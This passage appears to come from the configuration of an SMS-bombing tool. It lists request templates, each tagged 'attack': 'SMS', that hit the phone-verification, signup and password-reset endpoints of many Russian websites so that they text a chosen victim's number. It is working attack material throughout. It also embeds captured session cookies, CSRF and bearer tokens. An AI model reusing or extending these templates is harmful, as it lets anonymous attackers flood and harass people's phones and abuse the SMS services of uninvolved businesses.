            'cookies': {'tmr_lvid': 'e48ed0c45f0393dac1c7b4936c5dd036', 'tmr_lvidTS': '1677843154683', '_gid': 'GA1.2.205549525.1677843155', 'ccart': 'off', '_ym_uid': '1677843158994662721', '_ym_d': '1677843158', '_ym_isad': '1', 'city_auto_popup_shown': '1', 'city_id': '218', 'city_name': '%D0%93%D0%BB%D0%B0%D0%B7%D0%BE%D0%B2', 'city_full_name': '%D0%93%D0%BB%D0%B0%D0%B7%D0%BE%D0%B2%2C%20%D0%A3%D0%B4%D0%BC%D1%83%D1%80%D1%82%D1%81%D0%BA%D0%B0%D1%8F%20%D0%A0%D0%B5%D1%81%D0%BF', 'region_id': '369b5a9d-0467-43cb-8d43-b0c945c77561', 'region_name': '%D0%98%D0%B6%D0%B5%D0%B2%D1%81%D0%BA', 'region_subdomain': '""', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', 'uxs_uid': '2ba1a140-b9b7-11ed-b435-ef3dcf76ca23', 'auid': 'ed2f1029-94be-4f38-a867-723d6c8546c7:1pY4dK:ErIcvy5f_X7WxKsVFe1GLtdnsLORL475SUmNwOfN6lI', 'session_id': '97695088-5ae2-46d2-b65f-483f2b0c9739', '_gat_test': '1', '_gat_UA-11277336-11': '1', '_gat_UA-11277336-12': '1', '_gat_UA-11277336-1': '1', '_ym_visorc': 'b', '_ga': 'GA1.1.315334567.1677843155', '_ga_HJNSJ6NG5J': 'GS1.1.1677864065.3.1.1677864088.37.0.0', 'mindboxDeviceUUID': '449a44b0-e2bd-440a-a2b2-5c66d751b1dc', 'directCrm-session': '%7B%22deviceGuid%22%3A%22449a44b0-e2bd-440a-a2b2-5c66d751b1dc%22%7D',},
            'headers': {'AB-TESTS': '{"personal_feed":"cumulative"}', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://sunlight.net', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'X-Requested-With': 'SunlightFrontendApp', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'ZdesApteka.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://zdesapteka.ru/bitrix/services/main/ajax.php',
            'cookies': {'BITRIX_SM_SALE_UID': '3e28f92864b3fb64dec306737fd20d04', '_ym_uid': '1677610186327305096', '_ym_d': '1677610186', 'tmr_lvid': '554ae41c96d459c18eef2376a9a56444', 'tmr_lvidTS': '1677610186362', 'BX_USER_ID': '3fe9fbc20509f2d17ca605f8ca4a3027', 'PHPSESSID': 'GDxa0o2WHBUQzTZC7JX1n814HoRH1EJo', 'BITRIX_SM_GUEST_ID': '46587722', '_ym_visorc': 'w', '_gid': 'GA1.2.1687489659.1677923183', '_gat_UA-125964533-1': '1', '_ga_352NZ684QJ': 'GS1.1.1677923182.2.1.1677923184.0.0.0', 'tmr_detect': '1%7C1677923184806', '_ym_isad': '1', '_ga': 'GA1.2.1991184094.1677610186', '_gat_gtag_UA_125964533_1': '1', 'BITRIX_SM_LAST_VISIT': '04.03.2023+12%3A46%3A25', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1677963540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D',},
            'headers': {'authority': 'zdesapteka.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'bx-ajax': 'true', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://zdesapteka.ru', 'referer': 'https://zdesapteka.ru/auth/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'data': f'userPhone={number}&checkWord=%7B%7B122HY%7Dh%25dasfkjhasdkjhf34ir8yudskjfndfskethjufqqqq&repeat=0&SITE_ID=s1&sessid=6379bf5c5a83bc691170b9643a1f264f',
            'params': {'action': 'zs:main.ajax.AuthActions.sendAuthCode',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Evrasia.SPB.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://evrasia.spb.ru/signup/',
            'cookies': {'PHPSESSID': 'ab8141596f0863ae6499b4c7b4768f7d', 'BITRIX_SM_SALE_UID': '153595232', 'CHOOSED_RESTAURANT_EVERYTIME': 'true', 'BITRIX_CONVERSION_CONTEXT_s1': '%7B%22ID%22%3A12%2C%22EXPIRE%22%3A1678049940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D', 'tmr_lvid': '277fd5a2755ef6e726b3d3d0a8bdc1e4', 'tmr_lvidTS': '1678032294384', '_ym_uid': '167803229513269376', '_ym_d': '1678032295', '_ym_isad': '1', '_ga': 'GA1.3.610692389.1678032295', '_gid': 'GA1.3.111117154.1678032295', '_ym_visorc': 'w', 'BX_USER_ID': '638b4a5be06440103913f1bae46076aa', 'tmr_detect': '1%7C1678032327700',},
            'headers': {'authority': 'evrasia.spb.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'origin': 'https://evrasia.spb.ru', 'referer': 'https://evrasia.spb.ru/signup/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'name': 'User', 'username': f'+{number}', 'mail': email(), 'bday': '15/06/1984', 'dispatch1': 'sms', 'PERSONAL_GENDER': 'M', 'pers_data': 'yes',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Dostavka.Phali-Hinkali.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://dostavka.phali-hinkali.ru/profile/signup',
            'cookies': {'advanced-frontend': '048ddca9i88rngfjni93c04m2f', '_csrf-frontend': 'df1d25188a90d4b898f401ef993f7e26e17f4aceb7db6352d5d7a5c2bef6ee8fa%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22pnIZu9kdJGzUPjCYgbfU4zIGOgleRXgZ%22%3B%7D', '_gcl_au': '1.1.1504443698.1678032727', '_uc_referrer': 'https://yandex.uz/', '_ga': 'GA1.2.678544514.1678032737', '_gid': 'GA1.2.397211869.1678032737', '_ym_uid': '1678032741783052024', '_ym_d': '1678032741', '_ym_isad': '1', '_ym_visorc': 'w',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://dostavka.phali-hinkali.ru', 'Referer': 'https://dostavka.phali-hinkali.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-Token': 'eqwKouzN7QAknxW96bCtaDkqV-cB9kCTTiVrVvVYV6cKwkP4mfSGZG7Yb-i52u4xXkgxsjWMCdQBQgczpwAw_Q==', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'_csrf-frontend=eqwKouzN7QAknxW96bCtaDkqV-cB9kCTTiVrVvVYV6cKwkP4mfSGZG7Yb-i52u4xXkgxsjWMCdQBQgczpwAw_Q%3D%3D&SignupForm%5Bphone%5D={number}&SignupForm%5Bname%5D=User',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'TetaPizza.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://tetapizza.ru/bitrix/services/main/ajax.php',
            'cookies': {'USER_CITY': 'moskva', 'CITY_LAT': '55.756636', 'CITY_LON': '37.616773', 'USER_LANG': 'ru', 'PHPSESSID': 'Lz1pGlRTuvbYE1t7eebn0IneJd5tSoBp', '_ym_uid': '1678022473496524860', '_ym_d': '1678022473', '_ga_8W1YS8RF05': 'GS1.1.1678022473.1.0.1678022473.0.0.0', '_ga': 'GA1.1.492496289.1678022474', '_ym_visorc': 'w', '_ym_isad': '1', 'aa_v4_referrer': 'aHR0cHM6Ly95YW5kZXgudXov', 'aa_v4_search': '', 'WhiteCallback_visitorId': '12162287685', 'WhiteCallback_visit': '20545675809', 'WhiteSaas_uniqueLead': 'no', 'WidgetChat_invitation_3149426': 'true', 'WhiteCallback_shownOn': 'onshow', 'WhiteCallback_timeAll': '303', 'WhiteCallback_timePage': '303',},
            'headers': {'authority': 'tetapizza.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'bx-ajax': 'true', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://tetapizza.ru', 'referer': 'https://tetapizza.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-bitrix-csrf-token': '92e6201c7cf10532737c4b2cff1cbbed', 'x-bitrix-site-id': 's1',},
            'data': f'data[phone]={number}',
            'params': {'mode': 'class', 'c': 'gootax:profile', 'action': 'sendSms',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Oauth.AV.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://oauth.av.ru/check-phone',
            'cookies': {'_ym_uid': '1678017107840281246', '_ym_d': '1678017107', '_ym_isad': '1', '_gid': 'GA1.2.1657187859.1678017107', '_dc_gtm_UA-44837825-1': '1', '_ym_visorc': 'w', 'tmr_lvid': '47c75aad949ea71855ab672bc1149ad3', 'tmr_lvidTS': '1678017106753', '_sp_ses.dbf3': '*', 'session-cookie': '174983abdfcb73c1e166941f80267f93533b60a6063be715c596619e43f97af8ecc46c81ca71978debe59a67dcff19ef', 'XSRF-TOKEN': 'eyJpdiI6IlZ5Qi9pS3d2MExzWHhQWTEvbkVKb0E9PSIsInZhbHVlIjoiaTArdnR5US9ZUzN1N21uVlBrZlY0MGxnek5vYU9BenpoVDRGdmNoYkxzSktnWE5BK0hKQkN2QU5OSzN5U0JWYi9LOTVNWXNNcVIvUWJZVE9xM0RhdUhGc1RnVllSdEFFbEFCOTA5Zm9rWHgzRWZBc05yc2M2RGNrL05xdVJVN0IiLCJtYWMiOiJiMTAzNDE3ZTAzY2JlMGJjMzk1YmRiNGRjMmM2ZjM1MjY0YTZhOGE5ZjI2YmE3MWM5ZjBlZDYwZjNmZWVlYmJkIiwidGFnIjoiIn0%3D', 'laravel_session': 'eyJpdiI6Inl2VUhKQlE5RjBZeTVxcW5UK24vMWc9PSIsInZhbHVlIjoiUEFJQUVKR25pOGtQMGlyaU9OVzlrNUFJRXlHU043bjVqQzZLZUZVMktFZnVYMlFHQzVhWUhsdE1kUHM1OEFuWnpmcERJUC9yaFY5eW1LeDJCSVVDcDZWNkE0ajlXbXgvVmdXRDc1RWtVUTlBdW9BQ2dRMk02Z1lUb0hiQUhoMXciLCJtYWMiOiI5NjMyODQ4MzU3ZmEzYjYzNjVjM2Q1NmNlOGJkMGRmMDY4YTljNjQ4NzUxNjMwNGVkN2JlYjI5NTkyOGFjZDJiIiwidGFnIjoiIn0%3D', 'font': 'phone', '_sp_id.dbf3': '6cd885c5-b665-47cf-90af-4bf87fe75261.1678017107.1.1678017111..eada94ab-61e0-4776-bcca-199832950a03..a7e5bde3-4a3c-42fb-bc5a-a3f080ab81f7.1678017107039.7', '_ga': 'GA1.1.1823482927.1678017107', 'tmr_detect': '1%7C1678017110945', '_ga_D2FVM87H39': 'GS1.1.1678017106.1.1.1678017110.0.0.0', 'cted': 'modId%3Dlgdf6xru%3Bclient_id%3D1823482927.1678017107%3Bya_client_id%3D1678017107840281246',},
            'headers': {'authority': 'oauth.av.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://oauth.av.ru', 'referer': 'https://oauth.av.ru/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-ajax-token': 'e7e7220537cbd2b7f54a4b0c870163a2fa73b4c49626b452c4046b9a51acfadd', 'x-csrf-token': 'C1UcCT0gX4xQNz67kQenu2OByVfA3fjEjKrpkX8h', 'x-requested-with': 'XMLHttpRequest', 'x-xsrf-token': 'eyJpdiI6IlZ5Qi9pS3d2MExzWHhQWTEvbkVKb0E9PSIsInZhbHVlIjoiaTArdnR5US9ZUzN1N21uVlBrZlY0MGxnek5vYU9BenpoVDRGdmNoYkxzSktnWE5BK0hKQkN2QU5OSzN5U0JWYi9LOTVNWXNNcVIvUWJZVE9xM0RhdUhGc1RnVllSdEFFbEFCOTA5Zm9rWHgzRWZBc05yc2M2RGNrL05xdVJVN0IiLCJtYWMiOiJiMTAzNDE3ZTAzY2JlMGJjMzk1YmRiNGRjMmM2ZjM1MjY0YTZhOGE5ZjI2YmE3MWM5ZjBlZDYwZjNmZWVlYmJkIiwidGFnIjoiIn0=',},
            'json': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': '3332222.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://3332222.ru/phone/validate',
            'cookies': {'_ex_doNotShowCardModal': '0', '_ex_doNotShowClearBasketButton': '0', '_ex_doNotShowSuperCard': '0', 'connect.sid': 's%3AHl06HbVLglCB7L7E-5Gv76cKQn1aB6NU.TH4lGyNQ905z08q%2FIj21Aw%2FIgyr%2B2FLmtQCfIJb2Fcw', '_ga_52E8MEJLVE': 'GS1.1.1678015250.1.0.1678015250.0.0.0', '_ym_uid': '1678015258540619541', '_ym_d': '1678015258', '_ym_visorc': 'w', '_ym_isad': '1', 'tmr_lvid': 'ba76eaed84729acca8a31e453e1cbb46', 'tmr_lvidTS': '1678015265244', 'tmr_detect': '1%7C1678015266091', '_ga': 'GA1.2.272644490.1678015251', '_gid': 'GA1.2.900815025.1678015270',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://3332222.ru', 'Referer': 'https://3332222.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'x-csrf-token': 'Q8MxuGFA-gvTdMYukJ5_3ohXr7qIBHNA8iQQ',},
            'json': {'phone': f'{number} ',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'CityPizza.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.citypizza.ru/auth/sendphonev/',
            'cookies': {'PHPSESSID': '85e3dc2c434052de459e5d8d113302cd', 'adspire_uid': 'AS.181289728.1678008304', 'tmr_lvid': '9df4475dbce0c93a2bbbb429c6b524e1', 'tmr_lvidTS': '1678008304710', '_ym_uid': '1678008305236975907', '_ym_d': '1678008305', '__utmc': '1891747', '__utmz': '1891747.1678008305.1.1.utmcsr=yandex.uz|utmccn=(referral)|utmcmd=referral|utmcct=/', '_ga': 'GA1.2.2064390988.1678008305', '_gid': 'GA1.2.966162964.1678008306', '_ym_isad': '1', '__utma': '1891747.2064390988.1678008305.1678008305.1678010469.2', '__utmt': '1', '__utmb': '1891747.1.10.1678010469', 'tmr_detect': '1%7C1678010468865', '_ym_visorc': 'w', '_gaclientid': '2064390988.1678008305', '_gasessionid': '20230305|09413416', '_gahitid': '15:01:08', '_gat_UA-238645129-1': '1', 'token': 'FMeAd21MAyQesNb93WvElmggu8Z5z5WDfbM3v0J3ygz9h0OsxYGeEnGXI5m0h6BDg6yc1TG60O8%2FDHKIBimzL3EISsNWk1N3vJA0tkNzSF%2BcfHXI77Wlc4oAcLRPpEGUdEeMhpqtIsahPqFsR1oQy7BY5P0xZCDdFT2iZhkNc7NkcbPFdsdwVRB54s%2FBXf5ccN9DLWYPsXq6USYypIZy8TMgzcbzTQ4v2yqR6QIoNhD3RCuj01lvEo0RbMacvCSit2DJtG5pW7zBbdoAQPH6adf0rlwIiH8%2Bl%2FhNXogIJb%2FIy1PLhLkNF2jQkzG6Uqe97kZLOjhF%2B%2B0ZP8AOkA%2Fq5BIZvXaL0hi%2BwaDL5Kk3PgXxOWpeYaDSkTeG2oqUk1Robn63k%2BOVjtrjewXALT%2BfouSkGy2gThc6pPvhOoxck3VFyjSespmNnt25RYBeBPz6UKOtBOGzVtV2uqGhRC%2BE91iCHmbSUwM9LJBrlipsPEYc', 'refresh_token': 'sL8JQKTJazbZvUwwbDEZDSQj5InC7W6bZGuOAkJHjRaOXZPO%2B8x8mb2fa%2FcszdZ%2FGuR3MA%3D%3D', '__cf_bm': 's88h4727V.pWcskaiktP31UFjzFeqJcV2W5qjyu1PQ8-1678010469-0-AYlEqfiU3IkQnXUlHjhUzTMh6+swzBldfd0B7jtIqbKlXVA2J+ibL2OLtwLm20m9YuZ9Ruoe4PKPKZGKCJxMS0oBFucPB96wM/D+d+WocupUgrXi0XAtYn6MLZ8r3qlJIj3krGwRbo9Gm+ld1RVB0Po=',},
            'headers': {'authority': 'www.citypizza.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://www.citypizza.ru', 'referer': 'https://www.citypizza.ru/auth/login/', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'phone={str(number)[1:]}&regiserToken=dc85a3579732840bcbe3&g-recaptcha-response=',
        },
        {
            'info': {'country': 'RU', 'attack': None, 'website': 'Budzdorov.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.budzdorov.ru/rest/V2/recaptcha/customers',
            'cookies': {'gtm_url_params': '{"utm_source":"admitad","utm_medium":"cpa","utm_campaign":"701280","utm_term":"|UIDwde7Ej","tagtag_uid":"4e4977aa4e310bd4fa802a27b8e70b32"}', 'gtm_source': 'admitad', 'gtm_medium': 'cpa', 'mindboxDeviceUUID': '0ba0265f-5260-4641-9b4e-a5232721925c', 'directCrm-session': '%7B%22deviceGuid%22%3A%220ba0265f-5260-4641-9b4e-a5232721925c%22%7D', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_ym_uid': '1679311352933596849', '_ym_d': '1679311352', '_gcl_au': '1.1.282379169.1679311352', '_ym_isad': '1', '_ym_visorc': 'b', '_gid': 'GA1.2.819467415.1679311355', 'tmr_lvid': '5961f0f78bcb1295f69c9a70cc8c7d3d', 'tmr_lvidTS': '1679311354850', 'st_uid': 'f6f51cc34547372ec1983eff20555111', 'tagtag_aid': '4e4977aa4e310bd4fa802a27b8e70b32', 'tagtag_aid': '4e4977aa4e310bd4fa802a27b8e70b32', 'tagtag_aid': '4e4977aa4e310bd4fa802a27b8e70b32', 'tt_deduplication_cookie': 'adm', 'tt_deduplication_cookie': 'adm', 'tt_deduplication_cookie': 'adm', 'regionSuggested': '1', 'quoteId': 'aa6c1568134d5a26922c13b997941cb1', '_dc_gtm_UA-76167714-1': '1', '_ga': 'GA1.1.433347867.1679311352', 'tmr_detect': '1%7C1679312475923', '_ga_9SJR75L9RQ': 'GS1.1.1679311352.1.1.1679312475.60.0.0', 'private_content_version': '8b249135c266f6eff5fb99ba211f02b2',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Authorization': 'Bearer istj5q47csroxde8kge4uqole7ndy3ox', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://www.budzdorov.ru', 'Referer': 'https://www.budzdorov.ru/customer/account/create', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-APP': 'WEB', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'customer': {'email': email(), 'firstname': 'User', 'middlename': '', 'lastname': '', 'extension_attributes': {'is_subscribed': False, 'telephone': f'+{number}', 'via_sms_notify': True, 'favorite_store_point': 0,},}, 'password': '3p9-NUh-YiN-ffT', 'redirectUrl': '', 'recaptcha': '03AFY_a8W4B-wm-OEM5wmSwvZdPefx5QonTISiv_51YGQLa4zggw7Y0gU70XXNuxrgb1p-N2J8BhKZMhxcHWckkGnzwsxuvjOovPWV_ZfQ2cPPuRO2oS3BGVo1_aOnLc4BwCUgwgAIy32k_N2MvKvFwShnTiFCAGrtXIC4x3gJvftpN9ZTjcNV5Pk3ws7SVrRpJsZs-i-DMuJJprO1tiaAVxdFnvPk5BHx9G4TJBZPgY5KEgOn6_dBgXF1W9zJlXcfjW9a3_Iy4wGX6S4o8jsZCC6sBXIn8puwkr0f0Qne-6XeBuPsof8TRGK8prs-oDZsEOi_fb_xpXKQD3YKig5gKP8KYImxLy7u47QUCwgYae5SbaMRaHJBzodyo6Tyo95frZb_SqVOm7IBubd-9xFeHaxM9aDy4iZ_sSnvPfFjJRIYAjMBdbHmPeor3X3xsZjQLIGZUYzuOSaZnWvf5AuOjwN-NpEWzr9zIwFLiOfKbR7D_AFbcCGYEirheweUIGJfzsdWrTHAkcit',},
            # Регистрация без смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Budzdorov.ru', 'anonymous': 'Yes'},
            'method': 'put',
            'url': 'https://www.budzdorov.ru/rest/V1/customers/smsAccount/password',
            'cookies': {'gtm_url_params': '{"utm_source":"admitad","utm_medium":"cpa","utm_campaign":"701280","utm_term":"|UIDwde7Ej","tagtag_uid":"4e4977aa4e310bd4fa802a27b8e70b32"}', 'gtm_source': 'admitad', 'gtm_medium': 'cpa', 'mindboxDeviceUUID': '0ba0265f-5260-4641-9b4e-a5232721925c', 'directCrm-session': '%7B%22deviceGuid%22%3A%220ba0265f-5260-4641-9b4e-a5232721925c%22%7D', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_ym_uid': '1679311352933596849', '_ym_d': '1679311352', '_gcl_au': '1.1.282379169.1679311352', '_ym_isad': '1', '_ym_visorc': 'b', '_gid': 'GA1.2.819467415.1679311355', 'tmr_lvid': '5961f0f78bcb1295f69c9a70cc8c7d3d', 'tmr_lvidTS': '1679311354850', 'st_uid': 'f6f51cc34547372ec1983eff20555111', 'tagtag_aid': '4e4977aa4e310bd4fa802a27b8e70b32', 'tagtag_aid': '4e4977aa4e310bd4fa802a27b8e70b32', 'tagtag_aid': '4e4977aa4e310bd4fa802a27b8e70b32', 'tt_deduplication_cookie': 'adm', 'tt_deduplication_cookie': 'adm', 'tt_deduplication_cookie': 'adm', 'regionSuggested': '1', 'quoteId': 'cec5cf55cadb4f3361117f0353364c74', '_dc_gtm_UA-76167714-1': '1', '_ga': 'GA1.1.433347867.1679311352', 'tmr_detect': '1%7C1679313129770', '_ga_9SJR75L9RQ': 'GS1.1.1679311352.1.1.1679313129.41.0.0', 'private_content_version': '8b249135c266f6eff5fb99ba211f02b2',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Authorization': 'Bearer istj5q47csroxde8kge4uqole7ndy3ox', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://www.budzdorov.ru', 'Referer': 'https://www.budzdorov.ru/customer/account/forgotpassword', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-APP': 'WEB', 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'contact': f'+{number}', 'recaptcha': '', 'type': 'telephone', 'template': 'email_reset', 'websiteId': 0,},
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'CloudBeeline.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://cloudbeeline.ru/api/2/accounts/beeline_request_code/',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://auth.cloudbeeline.ru', 'Referer': 'https://auth.cloudbeeline.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'lk.Zaim-Express.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://lk.zaim-express.ru/Account/RegisterCode',
            'cookies': {'_ze_visiter': '53C0B392-01FC-4C7A-A767-68959531A229', '_ze_referer': 'https%3A%2F%2Fyandex.uz%2F', '_ze_referer_time': '20230306171133', '_ym_uid': '1678111896747469706', '_ym_d': '1678111896', 'tmr_lvid': '80be4ca099d804b042a43d2ccd1ac06f', 'tmr_lvidTS': '1678111896169', '_ym_visorc': 'b', '_ym_isad': '1', '_gid': 'GA1.2.973038055.1678111897', 'pt_s_2f1af163': 'vt=1678111897188&cad=', '_hjSessionUser_1926565': 'eyJpZCI6ImNjYTQyYmRkLTNhMmUtNTdkNi1iOTk2LThmZjVmMzQ2YjlhZCIsImNyZWF0ZWQiOjE2NzgxMTE4OTc2MTEsImV4aXN0aW5nIjpmYWxzZX0=', '_hjFirstSeen': '1', '_hjIncludedInSessionSample_1926565': '0', '_hjSession_1926565': 'eyJpZCI6IjE3MjQ2N2QwLWI0YTAtNGM0My1hYmYxLTMzNzczZTBlY2Y2MiIsImNyZWF0ZWQiOjE2NzgxMTE4OTc2MTgsImluU2FtcGxlIjpmYWxzZX0=', '_hjAbsoluteSessionInProgress': '0', '_gat_gtag_UA_76114749_2': '1', 'pt_2f1af163': 'deviceId%3D51bedf7a-723b-4067-8696-ea13d041772f%26sessionId%3D3e5fbcf6-4888-400e-9e5b-84675e576520%26accountId%3D%26vn%3D2%26pvn%3D1%26sact%3D1678112292572%26', '.LoanExpress.Session': 'CfDJ8PIBqEVSjzpBkUhnd5gD6hTc42bd3%2Fqt4AM1BHrhdbv7B4nbuO%2FWKfqLPK4TXa5z%2Bcxcn7SVB2refOMUlPYn1BJBkHkQzvl3wJDuXDWFh%2FY2SOKpHW9E33qOIJv%2BeM8NUHb8cQihXxYh%2BtSskYOjeA91uFhaYwV1F3vZfBPcRNSk', '.AspNetCore.Antiforgery.YwBUPdAxP0c': 'CfDJ8PIBqEVSjzpBkUhnd5gD6hQYzRbiBppJIx-xIzB7Z_A1WbfjZunfMK4E9R681l80dWZfL6RbguQ8YPTzER5k8ZsujFiH40cnzUZykhmrVZE9L5sKvjyxq-nrHy40tsVzyTM6hEDlcCdW2yxK_cQbbzs', 'mindboxDeviceUUID': '01daad34-d71d-4687-a635-cfe43afce972', 'directCrm-session': '%7B%22deviceGuid%22%3A%2201daad34-d71d-4687-a635-cfe43afce972%22%7D', '_ga_2JB47PMSVE': 'GS1.1.1678111896.1.1.1678112295.0.0.0', '_ga': 'GA1.1.1640784630.1678111897',},
